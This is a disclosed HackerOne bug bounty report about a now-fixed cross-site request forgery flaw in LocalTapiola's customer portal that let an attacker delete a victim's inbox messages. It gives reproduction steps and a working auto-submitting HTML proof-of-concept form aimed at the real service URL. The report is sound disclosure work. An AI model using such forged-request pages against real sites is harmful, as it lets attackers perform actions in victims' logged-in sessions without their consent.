ReportLink:https://hackerone.com/reports/123339
WeaknessName:Cross-Site Request Forgery (CSRF)
Reporter:https://hackerone.com/putsi
ReportedTo:LocalTapiola(localtapiola)
BountyAmount:500.0
Severity:medium
State:Closed
DateOfDisclosure:25.02.2017 12:15:34

Summary:
##Issue
The reporter was able to remove items from the customer inbox due to missing CSRF-token protection. The exploit required the user (victim) to have a valid and active session in the service.

##Fix

The application was fixed.

##Reasoning

CSRF can potentially be very serious. In this case, the impact was limited in many ways due to the fact that the attacker needed the victim to have an active session and that the victim was recently active in his/her customer inbox.
## Description
If the customer navigates to the CSRF-attack page shortly after viewing any message details on the "Postilaatikko", the last item that was viewed by the customer will be deleted.
Please see the attached video for an illustration of the bug.

## Steps to reproduce
1. Log in to the Lähitapiola.
2. Navigate to "Vakuutukset" --> "Postilaatikko".
3. Open the details page of e.g. "Asiakastietomuutos"-message.
4. (optional) Navigate to any other page of Lähitapiola-website or click the "Takaisin postilaatikkoon"-button.
5. Open the CSRF-attackpage.
6. Notice that the message was deleted due to the CSRF-request.

## Proof of concept
```
<html>
  <!-- CSRF PoC - generated by Burp Suite Professional -->
  <body>
    <form action="https://verkkopalvelu.tapiola.fi/a2/AsiakassalkkuWeb/naytaviestiketju.do">
      <input type="hidden" name="mn" value="p" />
      <input type="submit" value="Submit request" />
    </form>
    <script>
      document.forms[0].submit();
    </script>
  </body>
</html>
```